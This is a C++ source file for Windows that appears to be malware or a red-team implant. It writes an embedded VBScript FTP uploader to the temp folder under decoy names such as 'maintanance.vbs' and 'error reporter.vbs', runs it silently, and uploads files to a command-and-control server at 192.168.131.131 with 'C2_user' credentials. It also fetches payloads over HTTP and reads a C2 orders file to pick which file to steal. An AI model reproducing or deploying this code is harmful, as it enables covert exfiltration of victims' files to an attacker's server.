#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>
#include <iostream>
#include <string>
#include <limits>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <bitset>
#include <regex>
#include "utilities.h"
#pragma comment(lib,"ws2_32.lib")

using std::string;


HINSTANCE hInst;
WSADATA wsaData;
void mParseUrl(char *mUrl, string &serverName, string &filepath, string &filename);
SOCKET connectToServer(char *szServerName, WORD portNum);
int getHeaderLength(char *content);
char *readUrl2(char *szUrl, long &bytesReturnedOut, char **headerOut);

std::string VbUploadFile = "Function FTPUpload(sSite, sUsername, sPassword, sLocalFile, sRemotePath)\n"
"  'This script is provided under the Creative Commons license located\n"
"  'at http://creativecommons.org/licenses/by-nc/2.5/ . It may not\n"
"  'be used for commercial purposes with out the expressed written consent\n"
"  'of NateRice.com\n"
"\n"
"  Const OpenAsDefault = -2\n"
"  Const FailIfNotExist = 0\n"
"  Const ForReading = 1\n"
"  Const ForWriting = 2\n"
"  \n"
"  Set oFTPScriptFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
"  Set oFTPScriptShell = CreateObject(\"WScript.Shell\")\n"
"\n"
"  sRemotePath = Trim(sRemotePath)\n"
"  sLocalFile = Trim(sLocalFile)\n"
"  \n"
"  '----------Path Checks---------\n"
"  'Here we willcheck the path, if it contains\n"
"  'spaces then we need to add quotes to ensure\n"
"  'it parses correctly.\n"
"  If InStr(sRemotePath, \" \") > 0 Then\n"
"    If Left(sRemotePath, 1) <> \"\"\"\" And Right(sRemotePath, 1) <> \"\"\"\" Then\n"
"      sRemotePath = \"\"\"\" & sRemotePath & \"\"\"\"\n"
"    End If\n"
"  End If\n"
"  \n"
"  If InStr(sLocalFile, \" \") > 0 Then\n"
"    If Left(sLocalFile, 1) <> \"\"\"\" And Right(sLocalFile, 1) <> \"\"\"\" Then\n"
"      sLocalFile = \"\"\"\" & sLocalFile & \"\"\"\"\n"
"    End If\n"
"  End If\n"
"\n"
"  'Check to ensure that a remote path was\n"
"  'passed. If it's blank then pass a \"\\\"\n"
"  If Len(sRemotePath) = 0 Then\n"
"    'Please note that no premptive checking of the\n"
"    'remote path is done. If it does not exist for some\n"
"    'reason. Unexpected results may occur.\n"
"    sRemotePath = \"\\\"\n"
"  End If\n"
"  \n"
"  'Check the local path and file to ensure\n"
"  'that either the a file that exists was\n"
"  'passed or a wildcard was passed.\n"
"  If InStr(sLocalFile, \"*\") Then\n"
"    If InStr(sLocalFile, \" \") Then\n"
"      FTPUpload = \"Error: Wildcard uploads do not work if the path contains a \" & _\n"
"      \"space.\" & vbCRLF\n"
"      FTPUpload = FTPUpload & \"This is a limitation of the Microsoft FTP client.\"\n"
"      Exit Function\n"
"    End If\n"
"  ElseIf Len(sLocalFile) = 0 Then\n"
"    'nothing to upload\n"
"    FTPUpload = \"Error: File Not Found.\"\n"
"    Exit Function\n"
"  End If\n"
"  '--------END Path Checks---------\n"
"  \n"
"  'build input file for ftp command\n"
"  sFTPScript = sFTPScript & \"USER \" & sUsername & vbCRLF\n"
"  sFTPScript = sFTPScript & sPassword & vbCRLF\n"
"  sFTPScript = sFTPScript & \"cd \" & sRemotePath & vbCRLF\n"
"  sFTPScript = sFTPScript & \"binary\" & vbCRLF\n"
"  sFTPScript = sFTPScript & \"prompt n\" & vbCRLF\n"
"  sFTPScript = sFTPScript & \"put \" & sLocalFile & vbCRLF\n"
"  sFTPScript = sFTPScript & \"quit\" & vbCRLF & \"quit\" & vbCRLF & \"quit\" & vbCRLF\n"
"\n"
"\n"
"  sFTPTemp = oFTPScriptShell.ExpandEnvironmentStrings(\"%TEMP%\")\n"
"  sFTPTempFile = sFTPTemp & \"\\\" & oFTPScriptFSO.GetTempName\n"
"  sFTPResults = sFTPTemp & \"\\\" & oFTPScriptFSO.GetTempName\n"
"\n"
"  'Write the input file for the ftp command\n"
"  'to a temporary file.\n"
"  Set fFTPScript = oFTPScriptFSO.CreateTextFile(sFTPTempFile, True)\n"
"  fFTPScript.WriteLine(sFTPScript)\n"
"  fFTPScript.Close\n"
"  Set fFTPScript = Nothing  \n"
"\n"
"  oFTPScriptShell.Run \"%comspec% /c FTP -n -s:\" & sFTPTempFile & \" \" & sSite & _\n"
"  \" > \" & sFTPResults, 0, TRUE\n"
"  \n"
"  Wscript.Sleep 1000\n"
"  \n"
"  'Check results of transfer.\n"
"  Set fFTPResults = oFTPScriptFSO.OpenTextFile(sFTPResults, ForReading, _\n"
"  FailIfNotExist, OpenAsDefault)\n"
"  sResults = fFTPResults.ReadAll\n"
"  fFTPResults.Close\n"
"  \n"
"  oFTPScriptFSO.DeleteFile(sFTPTempFile)\n"
"  oFTPScriptFSO.DeleteFile (sFTPResults)\n"
"  \n"
"  If InStr(sResults, \"226 Transfer complete.\") > 0 Then\n"
"    FTPUpload = True\n"
"  ElseIf InStr(sResults, \"File not found\") > 0 Then\n"
"    FTPUpload = \"Error: File Not Found\"\n"
"  ElseIf InStr(sResults, \"cannot log in.\") > 0 Then\n"
"    FTPUpload = \"Error: Login Failed.\"\n"
"  Else\n"
"    FTPUpload = \"Error: Unknown.\"\n"
"  End If\n"
"\n"
"  Set oFTPScriptFSO = Nothing\n"
"  Set oFTPScriptShell = Nothing\n"
"End Function\n"
"\n"
"Function FTPDownload(sSite, sUsername, sPassword, sLocalPath, sRemotePath, _\n"
"         sRemoteFile)\n"
"  'This script is provided under the Creative Commons license located\n"
"  'at http://creativecommons.org/licenses/by-nc/2.5/ . It may not\n"
"  'be used for commercial purposes with out the expressed written consent\n"
"  'of NateRice.com\n"
"\n"
"  Const OpenAsDefault = -2\n"
"  Const FailIfNotExist = 0\n"
"  Const ForReading = 1\n"
"  Const ForWriting = 2\n"
"  \n"
"  Set oFTPScriptFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
"  Set oFTPScriptShell = CreateObject(\"WScript.Shell\")\n"
"\n"
"  sRemotePath = Trim(sRemotePath)\n"
"  sLocalPath = Trim(sLocalPath)\n"
"  \n"
"  '----------Path Checks---------\n"
"  'Here we will check the remote path, if it contains\n"
"  'spaces then we need to add quotes to ensure\n"
"  'it parses correctly.\n"
"  If InStr(sRemotePath, \" \") > 0 Then\n"
"    If Left(sRemotePath, 1) <> \"\"\"\" And Right(sRemotePath, 1) <> \"\"\"\" Then\n"
"      sRemotePath = \"\"\"\" & sRemotePath & \"\"\"\"\n"
"    End If\n"
"  End If\n"
"  \n"
"  'Check to ensure that a remote path was\n"
"  'passed. If it's blank then pass a \"\\\"\n"
"  If Len(sRemotePath) = 0 Then\n"
"    'Please note that no premptive checking of the\n"
"    'remote path is done. If it does not exist for some\n"
"    'reason. Unexpected results may occur.\n"
"    sRemotePath = \"\\\"\n"
"  End If\n"
"  \n"
"  'If the local path was blank. Pass the current\n"
"  'working direcory.\n"
"  If Len(sLocalPath) = 0 Then\n"
"    sLocalpath = oFTPScriptShell.CurrentDirectory\n"
"  End If\n"
"  \n"
"  If Not oFTPScriptFSO.FolderExists(sLocalPath) Then\n"
"    'destination not found\n"
"    FTPDownload = \"Error: Local Folder Not Found.\"\n"
"    Exit Function\n"
"  End If\n"
"  \n"
"  sOriginalWorkingDirectory = oFTPScriptShell.CurrentDirectory\n"
"  oFTPScriptShell.CurrentDirectory = sLocalPath\n"
"  '--------END Path Checks---------\n"
"  \n"
"  'build input file for ftp command\n"
"  sFTPScript = sFTPScript & \"USER \" & sUsername & vbCRLF\n"
"  sFTPScript = sFTPScript & sPassword & vbCRLF\n"
" ' sFTPScript = sFTPScript & \"cd \" & sRemotePath & vbCRLF\n"
" ' sFTPScript = sFTPScript & \"binary\" & vbCRLF\n"
" ' sFTPScript = sFTPScript & \"prompt n\" & vbCRLF\n"
" ' sFTPScript = sFTPScript & \"mget \" & sRemoteFile & vbCRLF\n"
"  sFTPScript = sFTPScript & \"quit\" & vbCRLF & \"quit\" & vbCRLF & \"quit\" & vbCRLF\n"
"\n"
"\n"
"  sFTPTemp = oFTPScriptShell.ExpandEnvironmentStrings(\"%TEMP%\")\n"
"  sFTPTempFile = sFTPTemp & \"\\\" & oFTPScriptFSO.GetTempName\n"
"  sFTPResults = sFTPTemp & \"\\\" & oFTPScriptFSO.GetTempName\n"
"\n"
"  'Write the input file for the ftp command\n"
"  'to a temporary file.\n"
"  Set fFTPScript = oFTPScriptFSO.CreateTextFile(sFTPTempFile, True)\n"
"  fFTPScript.WriteLine(sFTPScript)\n"
"  fFTPScript.Close\n"
"  Set fFTPScript = Nothing  \n"
"\n"
"  oFTPScriptShell.Run \"%comspec% /c FTP -n -s:\" & sFTPTempFile & \" \" & sSite & _\n"
"  \" > \" & sFTPResults, 0, TRUE\n"
"  \n"
"  Wscript.Sleep 1000\n"
"  \n"
"  'Check results of transfer.\n"
"  Set fFTPResults = oFTPScriptFSO.OpenTextFile(sFTPResults, ForReading, _\n"
"                    FailIfNotExist, OpenAsDefault)\n"
"  sResults = fFTPResults.ReadAll\n"
"  fFTPResults.Close\n"
"  \n"
"  'oFTPScriptFSO.DeleteFile(sFTPTempFile)\n"
"  'oFTPScriptFSO.DeleteFile (sFTPResults)\n"
"  \n"
"  If InStr(sResults, \"226 Transfer complete.\") > 0 Then\n"
"    FTPDownload = True\n"
"  ElseIf InStr(sResults, \"File not found\") > 0 Then\n"
"    FTPDownload = \"Error: File Not Found\"\n"
"  ElseIf InStr(sResults, \"cannot log in.\") > 0 Then\n"
"    FTPDownload = \"Error: Login Failed.\"\n"
"  Else\n"
"    FTPDownload = \"Error: Unknown.\"\n"
"  End If\n"
"  \n"
"  Set oFTPScriptFSO = Nothing\n"
"  Set oFTPScriptShell = Nothing\n"
"End Function\n\n";

int CreateUploadScript()
{
	TCHAR buf[MAX_PATH];
	GetTempPath(MAX_PATH, buf);
	std::string uploader = strcat(buf, "maintanance.vbs");
	WriteToFile(uploader, VbUploadFile);
	RunSilent(uploader.c_str(), "");
	return 0;
}

int UploadFile(std::string data)
{
	TCHAR buf[MAX_PATH];
	GetTempPath(MAX_PATH, buf);
	std::string uploadCommand = "FTPUpload \"192.168.131.131\", \"C2_user\", \"C2_password\", $$$$, \"/11\"";

	std::string uploaderScriptPath = strcat(buf, "error reporter.vbs");

	StrReplace(uploadCommand, "$$$$", data);
	std::string finalScript = VbUploadFile + uploadCommand;
	WriteToFile(uploaderScriptPath, finalScript);

	std::string uploaderScriptCmd = "cmd /c \"" + uploaderScriptPath + "\"";
	system(uploaderScriptCmd.c_str());
	remove(uploaderScriptPath.c_str());

	return 0;
}


int GetUrlOverHttp(char *szUrl, char *szDst)
{
	const int bufLen = 1024;
	long fileSize;
	char *memBuffer, *headerBuffer;
	FILE *fp;

	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0)
		return -1;


	memBuffer = readUrl2(szUrl, fileSize, &headerBuffer);
	//printf("returned from readUrl\n");
	//printf("data returned:\n%s", memBuffer);
	if (fileSize != 0)
	{
		//printf("Got some data\n");
		fp = fopen(szDst, "wb");
		fwrite(memBuffer, 1, fileSize, fp);
		fclose(fp);
		delete(memBuffer);
		delete(headerBuffer);
	}

	WSACleanup();
	return 0;
}


void mParseUrl(char *mUrl, string &serverName, string &filepath, string &filename)
{
	string::size_type n;
	string url = mUrl;

	if (url.substr(0, 7) == "http://")
		url.erase(0, 7);

	if (url.substr(0, 8) == "https://")
		url.erase(0, 8);

	n = url.find('/');
	if (n != string::npos)
	{
		serverName = url.substr(0, n);
		filepath = url.substr(n);
		n = filepath.rfind('/');
		filename = filepath.substr(n + 1);
	}

	else
	{
		serverName = url;
		filepath = "/";
		filename = "";
	}
}

SOCKET connectToServer(char *szServerName, WORD portNum)
{
	struct hostent *hp;
	unsigned int addr;
	struct sockaddr_in server;
	SOCKET conn;

	conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (conn == INVALID_SOCKET)
		return NULL;

	if (inet_addr(szServerName) == INADDR_NONE)
	{
		hp = gethostbyname(szServerName);
	}
	else
	{
		addr = inet_addr(szServerName);
		hp = gethostbyaddr((char*)&addr, sizeof(addr), AF_INET);
	}

	if (hp == NULL)
	{
		closesocket(conn);
		return NULL;
	}

	server.sin_addr.s_addr = *((unsigned long*)hp->h_addr);
	server.sin_family = AF_INET;
	server.sin_port = htons(portNum);
	if (connect(conn, (struct sockaddr*)&server, sizeof(server)))
	{
		closesocket(conn);
		return NULL;
	}
	return conn;
}

int getHeaderLength(char *content)
{
	const char *srchStr1 = "\r\n\r\n", *srchStr2 = "\n\r\n\r";
	char *findPos;
	int ofset = -1;

	findPos = strstr(content, srchStr1);
	if (findPos != NULL)
	{
		ofset = findPos - content;
		ofset += strlen(srchStr1);
	}

	else
	{
		findPos = strstr(content, srchStr2);
		if (findPos != NULL)
		{
			ofset = findPos - content;
			ofset += strlen(srchStr2);
		}
	}
	return ofset;
}

char *readUrl2(char *szUrl, long &bytesReturnedOut, char **headerOut)
{
	const int bufSize = 512;
	char readBuffer[bufSize], sendBuffer[bufSize], tmpBuffer[bufSize];
	char *tmpResult = NULL, *result;
	SOCKET conn;
	string server, filepath, filename;
	long totalBytesRead, thisReadSize, headerLen;

	mParseUrl(szUrl, server, filepath, filename);

	///////////// step 1, connect //////////////////////
	conn = connectToServer((char*)server.c_str(), 80);

	///////////// step 2, send GET request /////////////
	sprintf(tmpBuffer, "GET %s HTTP/1.0", filepath.c_str());
	strcpy(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	sprintf(tmpBuffer, "Host: %s", server.c_str());

	//std::cout << tmpBuffer << std::endl;
	//std::cout << sendBuffer << std::endl;


	strcat(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	strcat(sendBuffer, "\r\n");
	send(conn, sendBuffer, strlen(sendBuffer), 0);

	//    SetWindowText(edit3Hwnd, sendBuffer);
	//printf("Buffer being sent:\n%s", sendBuffer);

	///////////// step 3 - get received bytes ////////////////
	// Receive until the peer closes the connection
	totalBytesRead = 0;
	while (1)
	{
		memset(readBuffer, 0, bufSize);
		thisReadSize = recv(conn, readBuffer, bufSize, 0);

		if (thisReadSize <= 0)
			break;

		tmpResult = (char*)realloc(tmpResult, thisReadSize + totalBytesRead);

		memcpy(tmpResult + totalBytesRead, readBuffer, thisReadSize);
		totalBytesRead += thisReadSize;
	}

	headerLen = getHeaderLength(tmpResult);
	long contenLen = totalBytesRead - headerLen;
	result = new char[contenLen + 1];
	memcpy(result, tmpResult + headerLen, contenLen);
	result[contenLen] = 0x0;
	char *myTmp;

	myTmp = new char[headerLen + 1];
	strncpy(myTmp, tmpResult, headerLen);
	myTmp[headerLen] = NULL;
	delete(tmpResult);
	*headerOut = myTmp;

	bytesReturnedOut = contenLen;
	closesocket(conn);
	return(result);
}

string GetFileToSteal(char* c2OrdersPath) {

	std::ifstream htmlText;
	string line;

	string eduEmail = "(::)";
	string target = "";


	int testNum = 0;

	htmlText.open(c2OrdersPath);
	if (htmlText.good())
	{
		while (getline(htmlText, line))
		{
			std::regex e(eduEmail); // the pattern
			bool match = regex_search(line, e);
			if (match) {
				target = line.substr(10, line.length());
				// printf(target.c_str());
				++testNum;
			}
		}
	}
	htmlText.close();
	return target;
}